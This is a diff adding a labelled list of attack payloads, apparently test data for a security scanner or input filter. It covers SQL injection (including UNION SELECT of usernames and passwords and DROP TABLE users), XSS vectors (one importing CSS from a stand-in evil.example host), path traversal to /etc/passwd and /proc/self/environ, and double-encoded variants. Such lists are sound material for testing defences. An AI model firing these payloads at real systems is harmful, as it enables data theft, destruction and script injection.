@@ -1,0 +1,28 @@
+# SQL injection (new)
+SQLi|' OR 'x'='x
+SQLi|admin' OR '1'='1'--
+SQLi|1' ORDER BY 10--
+SQLi|' UNION ALL SELECT username,password FROM users--
+SQLi|1; DROP TABLE users
+SQLi|1 AND 1=1
+SQLi|1' AND (SELECT COUNT(*) FROM users)>0--
+SQLi|' OR ''='
+SQLi|' || (SELECT 1) || '
+SQLi|1 UNION SELECT NULL
+# XSS (new)
+XSS|<details open ontoggle=alert(1)>
+XSS|<svg/onload=alert(1)>
+XSS|<video><source onerror=alert(1)>
+XSS|<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+XSS|<style>@import 'http://evil.example/x.css';</style>
+XSS|'-alert(1)-'
+XSS|<scr<script>ipt>alert(1)</script>
+# Path traversal (new)
+PathTraversal|..%2f..%2f..%2fetc%2fpasswd
+PathTraversal|/proc/self/environ
+PathTraversal|C:\Windows\System32\drivers\etc\hosts
+PathTraversal|..././..././etc/passwd
+PathTraversal|file:///etc/passwd
+# Encoding tricks (new)
+DoubleEncoded|%252e%252e%252fetc%252fpasswd
+DoubleEncoded|%2527%2520UNION%2520SELECT%25201,2--
